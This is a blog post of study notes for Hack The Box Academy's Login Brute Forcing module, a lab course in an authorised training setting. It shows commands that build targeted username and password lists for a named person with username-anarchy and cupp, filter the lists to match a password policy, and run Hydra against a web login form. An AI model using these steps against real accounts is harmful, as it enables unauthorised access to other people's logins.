---
layout: post
title:  "Hack The Box - Academy - Login Brute Forcing"
description: "Explore this detailed walkthrough of Hack The Box Academy's Login Brute Forcing module. Learn effective techniques to perform login brute-force attacks, discover common vulnerabilities, and elevate your penetration testing skills with step-by-step insights from Zwarts Sec."
date:   2024-10-26 10:51
image:  /images/htb/login-brute-forcing/logo.png
tags:   [authentication,cbbh,brute-forcing]
categories: [htbacademy]
---

>
<b>Links:</b>
<br/>
<a href="https://academy.hackthebox.com/module/details/57">Login Brute Forcing</a><br/>
<a href="https://jacozwarts.github.io/images/htb/login-brute-forcing/Login_Brute_Forcing_Module_Cheat_Sheet.pdf">Login Brute Forcing - Cheat Sheet</a><br/>
<a href="https://academy.hackthebox.com/module/57/section/504">Hydra - Cheat Sheet</a><br/>

<br/>

### Notes:
#### Command to match passwords with min requirements using grep:

```
grep -E '^.{8,}$' darkweb2017-top10000.txt > darkweb2017-minlength.txt
```

#### Custom Wordlists:
```
sudo apt install ruby -y
```
```
git clone https://github.com/urbanadventurer/username-anarchy.git
```
`Use username-anarchy to generate possible usernames:`
```
./username-anarchy Jan van Zyl > jan_van_zyl_usernames.txt
```

![username-anarchy result](/images/htb/login-brute-forcing/username-anarchy-result.png)

`Install cupp`:
```
sudo apt install cupp -y
```
```
cupp -i
```

`Grep command to filter passwords to meet min requirements:`
```
grep -E '^.{6,}$' jan_van_zyl.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jan_van_zyl-filtered.txt
```
`Hydra post example:`
```
hydra -L jan_van_zyl_usernames.txt -P jan_van_zyl-filtered.txt IP -s PORT -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
```
<hr/>

## Skills Assessment
><b>Overview:</b>
The first part of the skills assessment will require you to brute-force the the target instance. Successfully finding the correct login will provide you with the username you will need to start Skills Assessment Part 2.

You might find the following wordlists helpful in this engagement: usernames.txt and passwords.txt

### Part 1: Inspect the Source Code and Identify JavaScript Functionality

### Part 1: After successfully brute forcing the login, what is the username you have been given for the next part of the skills assessment?

### Part 2: What is the username of the ftp user you find via brute-forcing?

### Part 2: What is the flag contained within flag.txt
<hr/>